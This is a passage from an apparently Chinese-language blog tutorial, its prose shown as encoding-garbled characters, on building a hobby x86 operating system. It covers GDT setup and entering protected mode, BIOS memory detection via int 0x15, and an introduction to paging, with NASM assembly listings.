id="PEæ¨¡å¼ä¸‹çš„å†…å­˜ä¿æŠ¤æªæ–½"><a href="#PEæ¨¡å¼ä¸‹çš„å†…å­˜ä¿æŠ¤æªæ–½" class="headerlink" title="PEæ¨¡å¼ä¸‹çš„å†…å­˜ä¿æŠ¤æªæ–½"></a>PEæ¨¡å¼ä¸‹çš„å†…å­˜ä¿æŠ¤æªæ–½</h2><p><del>éƒ½å«ä¿æŠ¤æ¨¡å¼äº†ä¿æŠ¤æªæ–½èƒ½å°‘ğŸ</del></p><p><strong>æ®µæè¿°ç¬¦&amp;é€‰æ‹©å­</strong></p><p>å¯¹ä½¿ç”¨<code>selector</code>çš„æ£€æŸ¥ï¼š<code>check</code>ç´¢å¼•å€¼ï¼Œ<code>check</code>æ˜¯å¦ä½¿ç”¨äº†gdtä¸­ç´¢å¼•ã€0ã€‘çš„æ®µæè¿°è¡¨</p><p>é’ˆå¯¹æ®µæè¿°ç¬¦ä¸­çš„<code>type</code>å­—æ®µï¼Œæœ‰ä¸‹åˆ—å‡ ä¸ªåŸåˆ™</p><ul><li>åªæœ‰å…·å¤‡å¯æ‰§è¡Œå±æ€§çš„æ®µæ‰èƒ½åŠ è½½åˆ°CSå¯„å­˜å™¨ä¸­</li><li>åªå…·æœ‰å¯æ‰§è¡Œå±æ€§çš„æ®µä¸å…è®¸åŠ è½½åˆ°é™¤CSå¤–çš„æ®µå¯„å­˜å™¨ä¸­</li><li>åªæœ‰å…·å¤‡å¯å†™å±æ€§çš„æ®µæ‰èƒ½åŠ è½½åˆ°SSå¯„å­˜å™¨ä¸­</li><li>è‡³å°‘å…·å¤‡å¯è¯»å±æ€§çš„æ®µæ‰èƒ½åŠ è½½åˆ°DSã€ESã€FSã€GSæ®µå¯„å­˜å™¨ä¸­</li></ul><p><code>check type</code>åï¼Œè¿˜ä¼š<code>chekc</code> Pä½ç¡®è®¤å†…å­˜æ®µæ˜¯å¦å­˜åœ¨ï¼Œè®¿é—®è¿‡ç›¸åº”æ®µåï¼Œä¼šå°†å…¶æ®µæè¿°ç¬¦ä¸­çš„Aä½ç½®1ï¼ˆè¿™ç®—ä»€ä¹ˆï¼Œæ ‡è®°ï¼Ÿbushiï¼‰</p><p><strong>Data &amp; System Segment</strong></p><p>æ®µç•Œé™check</p><p>æ®µç•Œé™ï¼š<br>$$<br>ï¼ˆæ®µç•Œé™+1ï¼‰*ç²’åº¦-1<br>$$<br>è¿™è¦æ³¨æ„è¿™ä¸ªå°±å·®ä¸å¤šäº†</p><p>okï¼Œå‰ç½®çŸ¥è¯†åŸºæœ¬è®²å®Œäº†ï¼Œå¯ä»¥è¿›å…¥ä¿æŠ¤æ¨¡å¼äº†ï¼ï¼ãƒ¾(â‰§â–½â‰¦*)o</p><h2 id="Letâ€™s-go"><a href="#Letâ€™s-go" class="headerlink" title="Letâ€™s go!"></a>Letâ€™s go!</h2><h3 id="boot-inc"><a href="#boot-inc" class="headerlink" title="boot.inc"></a>boot.inc</h3><p>å¤šäº†å¥½å¤šé…ç½®ä¿¡æ¯</p><p><code>nasm</code>è¿˜æŒºäººæ€§åŒ–çš„ï¼Œå¯ä»¥åœ¨æ•°å­—ä¸­åŠ â€_â€ä½¿æ•°ä½æ›´æ¸…æ¥šï¼Œä¸”ä¸å½±å“å€¼çš„è¡¨ç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----loader &amp; kernel msg-----<br>LOADER_BASE_ADDR equ 0x900<br>LOADER_START_SECTOR equ 0x2<br>;-----the value of GDT-----<br>DESC_G_4K equ 1000_0000_00000000_00000000b     ;G: 4kb<br>DESC_D_32 equ  100_0000_00000000_00000000b     ;D: 32ä½<br>DESC_L equ   00_0000_00000000_00000000b ;L: 32ä½ä»£ç æ®µ<br>DESC_AVLequ    0_0000_00000000_00000000b ;æ— æ„ä¹‰<br>DESC_LIMIT_CODE2 equ      1111_00000000_00000000b ;å¹³å¦æ¨¡å¼ï¼Œå°±æ˜¯0xf<br>DESC_LIMIT_DATA2 equ DESC_LIMIT_CODE2<br>DESC_LIMIT_VIDEO2equ      0000_00000000_00000000b ;è¿™è¾¹è®¾ç½®videoæ˜¯ä¸ºäº†è¡¨ç¤ºæ˜¾å­˜ï¼ˆ0xb8000ï¼‰ï¼Œæ‰€ä»¥limitè®¾ç½®0<br>DESC_Pequ           10000000_00000000b ;P: å­˜åœ¨<br>DESC_DPL_0equ            0000000_00000000b     <br>DESC_DPL_1equ          0100000_00000000b<br>DESC_DPL_2equ            1000000_00000000b<br>DESC_DPL_3equ            1100000_00000000b<br>DESC_S_CODEequ              10000_00000000b ;S: éç³»ç»Ÿæ®µï¼Œä»£ç æ®µ<br>DESC_S_DATAequ DESC_S_CODE                      ;S: éç³»ç»Ÿæ®µï¼Œæ•°æ®æ®µ<br>DESC_S_sys equ  00000_00000000b     ;S: ç³»ç»Ÿæ®µ<br>DESC_TYPE_CODEequ       1000_00000000b     ;åªæ‰§è¡Œä»£ç æ®µ<br>DESC_TYPE_DATAequ       0010_00000000b     ;åªè¯»ï¼Œå‘ä¸‹æ‰©å±•çš„æ•°æ®æ®µ<br>;-----code gdté«˜ä½4å­—èŠ‚-----<br>DESC_CODE_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_CODE2 + DESC_P + DESC_DPL_0 + DESC_S_CODE + DESC_TYPE_CODE + 0x00<br>;-----data gdté«˜å››ä½å­—èŠ‚-----<br>DESC_DATA_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_DATA2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00<br>;-----video gdté«˜å››ä½å­—èŠ‚-----<br>DESC_VIDEO_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x0b<br>;-----the value of selector-----<br>RPL0equ 00b<br>RPL1equ 01b<br>RPL2equ 10b<br>RPL3equ 11b<br>TI_GDTequ 000b<br>TI_LDTequ 100b<br></code></pre></td></tr></table></figure><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>mbrå’Œå‰é¢çš„è¿˜æ˜¯ä¸€æ ·çš„ã€‚åªæ˜¯load.sç»è¿‡ç¼–è¯‘åå¾—åˆ°çš„load.binçš„sizeå¤§äº512ï¼Œæ‰€ä»¥è¯»å–æ‰‡åŒºçš„æ•°é‡æ”¹å˜ï¼Œè¿™è¾¹ç›´æ¥æ”¹æˆ4äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,LOADER_START_SECTOR<br>mov bx,LOADER_BASE_ADDR<br>mov cx,4                    ;sector count<br>call rd_disk_m_16<br></code></pre></td></tr></table></figure><p>packçš„æ—¶å€™è„šæœ¬ä¹Ÿæœ‰å˜åŒ–</p><p><code>count</code>æ”¹ä¸º4</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=4 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><h3 id="Load-S"><a href="#Load-S" class="headerlink" title="Load.S"></a>Load.S</h3><p>load.sè¦æ”¹çš„å°±æ¯”è¾ƒå¤šäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>LOADER_STACK_TOP equ LOADER_BASE_ADDR<br><br>jmp loader_start<br><br>GDT_BASE:                   ;gdt[0]ä¸ºç©º<br>dd 0x00000000<br>dd 0x00000000<br><br>CODE_DESC:                  ;gdt[1]<br>dd 0x0000ffff<br>dd DESC_CODE_HIGH4<br><br>DATA_STACK_DESC:            ;gdt[2] <br>dd 0x0000ffff<br>dd DESC_DATA_HIGH4<br><br>VIDEO_DESC:                 ;gdt[3]<br>dd 0x80000007           ;(0xbffff-0xb8000)/4k = 7 <br>dd DESC_VIDEO_HIGH4<br><br>GDT_SIZEequ $ - GDT_BASE    ; 0x8*4<br>GDT_LIMITequ GDT_SIZE - 1    ; 0x20 - 1 <br>times 60 dq 0<br><br>SELECTOR_CODE equ (0x0001&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_DATAequ (0x0002&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_VIDEO equ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>gdt_ptrdw GDT_LIMIT<br>dd GDT_BASE<br><br>loadermsg db &#x27;korey is ready&#x27;<br><br>loader_start:<br>mov sp, LOADER_BASE_ADDR ;print &quot;korey is ready&quot;<br>mov bp, loadermsg<br>mov cx, 14<br>mov ax, 0x1301<br>mov bx, 0x001f<br>mov dx, 0x1800<br>int 0x10<br><br>in al, 0x92              ;open A20 gate<br>or al, 0000_0010b<br>out 0x92, al<br><br>lgdt [gdt_ptr]           ;load gdt<br> <br>mov eax, cr0             ;real mode to protection mode<br>or eax, 0x00000001<br>mov cr0, eax<br><br>jmp dword SELECTOR_CODE:p_mode_start    ;åˆ·æ–°æµæ°´çº¿<br><br>[bits 32]<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov byte [gs:160], &#x27;P&#x27;<br><br>jmp $<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>jmp dword SELECTOR_CODE:p_mode_start</code>è¿™å¥ä»£ç æ„Ÿè§‰æœ‰ç‚¹è„±è£¤å­æ”¾å±ï¼Œæ¯•ç«Ÿç¨‹åºæµåªè¦é¡ºåºæ‰§è¡Œä¹Ÿèƒ½æ»‘åˆ°<code>p_mode_start </code>ï¼Œé‚£ä¸ºä»€ä¹ˆç”¨<code>jmp</code>å‘¢ï¼Ÿå› ä¸ºCPUé‡‡ç”¨æµæ°´çº¿ä½œä¸šï¼ˆä¸Šé¢æåˆ°è¿‡ï¼‰ï¼Œä¼šå°†å‡ æ¡æŒ‡ä»¤æ”¾åœ¨ä¸€èµ·é‡å æ‰§è¡Œï¼ˆæ„Ÿè§‰<code>mips</code>æ¶æ„è¿™ä¸ªç‰¹ç‚¹å°±å¾ˆæ˜¾è‘—ï¼‰ï¼Œæ‰€ä»¥<code>p_mode_start</code>æ˜¯32ä½çš„ï¼Œå’Œ16ä½çš„ä¸€èµ·æ‰§è¡Œç›´æ¥èƒ½æŠŠCPUçš„CPUå¹²çƒ§äº†ï¼Œè¿™æ˜¯å…¶ä¸€ã€‚å…¶äºŒæ˜¯è™½ç„¶è¿›å…¥äº†32ä½ä¿æŠ¤æ¨¡å¼ï¼Œdsï¼Œcsï¼Œssè¿™äº›æ®µå¯„å­˜å™¨é‡Œè¿˜æ˜¯16ä½çš„æ®µåŸºå€ã€‚å…¶ä»–ä½é»˜è®¤0ï¼Œå¯¼è‡´Dä½&#x3D;0ï¼Œä¹Ÿå³æ˜¯è¿›å…¥32ä½æ¨¡å¼äº†æ®µå¯„å­˜å™¨è¿˜æ˜¯è¢«è®¤ä¸ºæ˜¯16ä½ï¼Œé‚£å°±éº»çƒ¦å¤§äº†ã€‚å¹¶ä¸”<code>mov cs, xxx</code>è¿™ç±»æŒ‡ä»¤æ˜¯è¢«ç¦æ­¢çš„ï¼Œåªæœ‰ç”¨è¿œè°ƒç”¨æŒ‡ä»¤<code>call</code>ï¼Œè¿œè½¬ç§»æŒ‡ä»¤<code>jmp</code>ï¼Œè¿œè¿”å›æŒ‡ä»¤<code>retf</code>å¯ä»¥é—´æ¥æ”¹å˜CSçš„å€¼ã€‚æ‰€ä»¥ç”¨<code>jmp</code>æ¸…ç©ºæµæ°´çº¿å¹¶åˆ·æ–°CSå¯„å­˜å™¨ã€‚</p><p>å±•ç¤ºä¸ªç»“æœ</p><p><img src="/img/OS/15.png" alt="img"></p><h1 id="0x3-PE-to-Kernel-ï¼ï¼"><a href="#0x3-PE-to-Kernel-ï¼ï¼" class="headerlink" title="0x3:PE to Kernel ï¼ï¼"></a>0x3:PE to Kernel ï¼ï¼</h1><h2 id="è·å–å†…å­˜å®¹é‡"><a href="#è·å–å†…å­˜å®¹é‡" class="headerlink" title="è·å–å†…å­˜å®¹é‡"></a>è·å–å†…å­˜å®¹é‡</h2><p><code>BIOS</code>çš„0x15ä¸­æ–­å·ä¸­ï¼Œæä¾›äº†3ä¸ªå­åŠŸèƒ½æ¥è·å–å†…å­˜å®¹é‡</p><ul><li>EAX &#x3D; 0xE820ï¼Œéå†æ‰€æœ‰å†…å­˜</li><li>EAX &#x3D; 0xE801ï¼Œæ£€æµ‹ä½15MBå’Œ16MB-4GBçš„å†…å­˜ï¼Œæœ€å¤§æ”¯æŒ4GB</li><li>AH &#x3D; 0x88ï¼Œæœ€å¤šæ£€æµ‹64MBï¼Œè¶…è¿‡64MBä¹Ÿè¿”å›64MB</li></ul><p>è¿™ä¸‰ç§åŠŸèƒ½è¿”å›çš„ä¿¡æ¯è¯¦ç»†ç¨‹åº¦ä¸€è¯5é€’å‡ï¼Œä½†æ˜¯æ“ä½œå¤æ‚ç¨‹åº¦åä¹‹</p><h3 id="0xE820"><a href="#0xE820" class="headerlink" title="0xE820"></a>0xE820</h3><p>æ­¤åŠŸèƒ½æ¯æ¬¡ä¼šè¿”å›ä¸€ä¸ªä¸åŒå±æ€§çš„å†…å­˜å¸ƒå±€ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦ä¸åœè¿­ä»£æ¥è·å–å…¨éƒ¨å†…å®¹</p><p>å› ä¸ºè¿”å›çš„ä¿¡æ¯è¾ƒä¸ºä¸°å¯Œï¼Œå¯„å­˜å™¨æ— æ³•å­˜æ”¾ï¼Œæ‰€ä»¥éœ€è¦ç»“æ„ä½“æ¥å­˜æ”¾è¿”å›å€¼ï¼Œæ­¤ç»“æ„ä½“ä¸ºåœ°å€èŒƒå›´æè¿°ç¬¦ï¼ˆAddress Range Descripter Structure, ARDSï¼‰ï¼Œæ ¼å¼å¦‚ä¸‹å›¾ã€‚æ­¤è¡¨æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/17.png" alt="img"></p><p>typeå­—æ®µçš„æ„ä¹‰å¦‚ä¸‹ã€‚æ­¤è¡¨æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/18.png" alt="img"></p><p>åŒæ—¶ï¼Œ0xE820åœ¨ä¸­æ–­å‰ï¼Œè¿˜éœ€è¦å‡ ä¸ªå¯„å­˜å™¨å¸ƒç½®å‚æ•°ï¼Œè¿”å›åçš„å€¼ä¹Ÿå‚¨å­˜åœ¨å‡ ä¸ªå¯„å­˜å™¨ä¸­ã€‚æ­¤è¡¨æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/19.png" alt="img"></p><p>åŠ¨æ‰‹å†™ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ï¼›å‰åŠéƒ¨åˆ†å’Œload.Sä¸€æ ·<br>times 60 dq 0<br><br>total_mem_bytes dd 0<br>gdt_ptr dw GDT_LIMIT<br>dd GDT_BASE<br><br>ards_buf times244 db 0<br>ards_nrdw 0<br><br>loader_start:<br>xor ebx,ebx<br>mov esi, ards_buf<br>mov es,esi<br>xor esi,esi<br>xor edi,edi<br>.e820:<br>mov eax,0xe820<br>mov ecx,20<br>mov edx,0x534d4150<br>int 0x15<br>add edi,20<br>cmp ebx, 0<br>jnz .e820<br><br>jmp $<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹ARDS</p><p><img src="/img/OS/20.png" alt="img"></p><h3 id="0xE801"><a href="#0xE801" class="headerlink" title="0xE801"></a>0xE801</h3><p>åªéœ€eaxå¯„å­˜å™¨&#x3D;0xe801å³å¯æ‰§è¡Œint 0x15è°ƒç”¨</p><p>è¿”å›æ—¶ï¼Œeax &#x3D; ecxï¼Œç²’åº¦ä¸º1kBï¼Œåªæ˜¾ç¤º15MBåŠä»¥ä¸‹çš„å†…å­˜å®¹é‡ï¼›ebx &#x3D; edxï¼Œç²’åº¦ä¸º64KBï¼Œæ˜¾ç¤º16MB-4GBçš„å†…å­˜</p><p>butæˆ‘ä»¬è·å¾—çš„å†…å­˜æ€»é‡æ€»æ˜¯æ¯”å®é™…å¤§å°å°1MBï¼Œè¿™æ˜¯ä¸ºäº†å…¼å®¹è€ISAè®¾å¤‡ï¼Œæœ€åè¾“å‡ºçš„æ—¶å€™åŠ ä¸Šå»å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.e801:<br>mov ax, 0xe801<br>int 0x15<br>mov ecx, 0x00000400<br>    mul ecx<br>    add eax, 0x100000<br>    mov esi, eax<br>    xor eax, eax<br>    mov eax, ebx<br>    mov ecx, 0x10000<br>    mul ecx<br>    add esi, eax<br><br>mov [total_mem_bytes],esi<br><br>jmp $<br></code></pre></td></tr></table></figure><p><img src="/img/OS/16.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#megs: 256<br>#megs: 128<br>megs: 64<br>#megs: 64<br>#megs: 16<br>#megs: 8<br></code></pre></td></tr></table></figure><p>å’Œé…ç½®æ–‡ä»¶ç›¸ç¬¦</p><h3 id="0x88"><a href="#0x88" class="headerlink" title="0x88"></a>0x88</h3><p>åªéœ€ah &#x3D; 0x88ï¼Œè¿”å›å€¼ä¹Ÿåªæœ‰ä¸€ä¸ªï¼Œå­˜å‚¨åœ¨eaxä¸­ï¼Œæœ€åå†åŠ ä¸Šä¸€ä¸ª1MBå°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.88:<br>mov ah, 0x88<br>int 0x15<br>mov ecx,0x400<br>mul ecx<br>add eax,0x100000<br><br>mov [total_mem_bytes],eax<br><br>jmp $<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜åˆ†é¡µ"><a href="#å†…å­˜åˆ†é¡µ" class="headerlink" title="å†…å­˜åˆ†é¡µ"></a>å†…å­˜åˆ†é¡µ</h2><p>å†…å­˜åˆ†é¡µè§£é™¤äº†çº¿æ€§å†…å­˜ä¸ç‰©ç†å†…å­˜ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œé€šè¿‡æ˜ å°„å…³ç³»ï¼Œå°†çº¿æ€§åœ°å€æ˜ å°„åˆ°ä»»æ„ç‰©ç†åœ°å€</p><p>å†…å­˜åˆ†é¡µç”±CPUæä¾›ç¡¬ä»¶ï¼ˆé¡µéƒ¨ä»¶ï¼‰æ”¯æŒï¼Œé€šè¿‡å»ºç«‹é¡µè¡¨ï¼Œä»¥åŠé¡µè¡¨æŸ¥è¯¢æ¥å®ç°æ˜ å°„å…³ç³»ï¼Œè¿™ä¹Ÿæ˜¯ç”±CPUå®Œæˆçš„ï¼Œæ¯•ç«Ÿåœ¨CPUçœ‹æ¥ï¼Œä¸€åˆ‡éƒ½æ˜¯æ…¢é€Ÿè®¾å¤‡ï¼Œä¸å¦‚è‡ªå·±æ¥ã€‚å½“ç„¶è¿˜å¾—æ„Ÿè°¢CPUè®¾è®¡å¸ˆä¸OSè®¾è®¡å¸ˆçš„åˆä½œã€‚</p><p>è‡³äºä»€ä¹ˆæ˜¯æ˜ å°„å…³ç³»ï¼Œè¿™ä¸ªåº”è¯¥ä¸ç”¨ç¬”è€…èµ˜è¿°äº†</p><h3 id="ä¸€çº§é¡µè¡¨"><a href="#ä¸€çº§é¡µè¡¨" class="headerlink" title="ä¸€çº§é¡µè¡¨"></a>ä¸€çº§é¡µè¡¨</h3><p>32ä½æ¶æ„çš„CPUçš„åœ°å€æ€»çº¿çš„maxæ˜¯4GB</p><p>CPUä»¥4kBä¸ºç²’åº¦ï¼Œå°†å†…å­˜åˆ†ä¸ºä¸€é¡µé¡µï¼Œæ­¤ä¸ºä¸€çº§é¡µè¡¨</p><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ°æ–¹æ¥å­˜å‚¨æ¯é¡µå†…å­˜çš„ä¿¡æ¯ï¼Œè¿™ä¸ªåœ°æ–¹å°±æ˜¯é¡µè¡¨ï¼ˆPage Tableï¼‰ã€‚é¡µè¡¨ä¸­çš„é¡¹ç§°ä¸ºé¡µè¡¨é¡¹ï¼ˆ Page Table Entryï¼ŒPTE ï¼‰ï¼Œå…¶å¤§å°æ˜¯ 4 å­—èŠ‚ï¼Œé¡µè¡¨é¡¹çš„ä½œç”¨æ˜¯å­˜å‚¨å†…å­˜ç‰©ç†åœ°å€ã€‚å½“è®¿é—®ä¸€ä¸ªçº¿æ€§åœ°å€æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨è®¿é—®é¡µè¡¨é¡¹ä¸­æ‰€è®°å½•çš„ç‰©ç†å†…å­˜åœ°å€ã€‚</p><p>ä¸‹å›¾ä¸ºä¸€çº§é¡µè¡¨ç¤ºæ„å›¾ã€‚æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/21.png" alt="img"></p><p>é¡µè¡¨é¡¹0-11ä½ä¸ºé¡µå†…å¯»å€</p><p>é¡µè¡¨é¡¹12-31ä½ä¸ºè¯¥é¡µè¡¨é¡¹åœ¨é¡µè¡¨ä¸­çš„<code>index</code></p><p>é¡µè¡¨çš„åœ°å€è¢«å­˜æ”¾åœ¨CR3å¯„å­˜å™¨ä¸­ï¼Œå¯ä»¥é€šè¿‡CR3å¯„å­˜å™¨ä¸­é¡µè¡¨é¡¹çš„ç‰©ç†åœ°å€ï¼ˆæ­¤æ—¶è¿˜æœªå¼€å¯åˆ†é¡µï¼‰+ index*4æ‰¾åˆ°ç›®æ ‡é¡µè¡¨é¡¹å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œæœ€ååŠ ä¸Šä½12ä½çš„åç§»ï¼Œå°±èƒ½è®¿é—®å¯¹åº”çš„ç‰©ç†åœ°å€</p><p>Butï¼Œæƒ³ä¸€ä¸‹ï¼Œ4GBæ€»å†…å­˜ï¼Œä»¥4kBçš„ç²’åº¦åˆ†ï¼Œå…‰é¡µè¡¨é¡¹å°±æœ‰<code>0x100000</code>ä¹‹å¤šï¼Œå­˜å‚¨è¿™äº›é¡µè¡¨é¡¹å°±è¦èŠ±è´¹4MBå¤§å°çš„å†…å­˜ã€‚å¹¶ä¸”æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„é¡µè¡¨ï¼Œå…‰æ˜¯è¿™äº›å†…å­˜å°±æ˜¯ä¸€ç¬”å¾ˆå¤§çš„å¼€é”€ï¼Œé‚£æ€ä¹ˆåŠæï¼Ÿ</p><p>ä¸€çº§é¡µè¡¨ä¸è¡Œï¼ŒğŸ‘´å†å¥—ä¸€å±‚ä¸è¡ŒğŸ</p><p>æ‰€ä»¥äºŒçº§é¡µè¡¨ä»–æ¥äº†</p><h3 id="äºŒçº§é¡µè¡¨"><a href="#äºŒçº§é¡µè¡¨" class="headerlink" title="äºŒçº§é¡µè¡¨"></a>äºŒçº§é¡µè¡¨</h3><p>å…ˆçœ‹ä¸€ä¸‹äºŒçº§é¡µè¡¨ç¤ºæ„å›¾ã€‚ä¸‹å›¾æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/22.png" alt="img"></p><p>è¿™æ¬¡CPUå­¦èªæ˜äº†ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª4KBå¤§å°çš„é¡µç›®å½•è¡¨ï¼Œå…¶ä¸­å­˜æ”¾ç€1024ä¸ªé¡µç›®å½•é¡¹ï¼ˆPage Directory Entryï¼Œ PDEï¼‰ã€‚ä½•ä¸ºé¡µç›®å½•é¡¹ï¼Ÿå°±æ˜¯é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œé¡µç›®å½•é¡¹å¤§å°åŒé¡µè¡¨é¡¹ä¸€æ ·ï¼Œéƒ½ç”¨æ¥æè¿°ä¸€ä¸ªç‰©ç†é¡µçš„ç‰©ç†åœ°å€ï¼Œå…¶å¤§å°éƒ½æ˜¯ 4 å­—èŠ‚ã€‚</p><p>é¡µç›®å½•è¡¨ä¸­å…± 1024 ä¸ªé¡µè¡¨ï¼Œä¹Ÿå°±æ˜¯æœ‰ 1024 ä¸ªé¡µç›®å½•é¡¹ 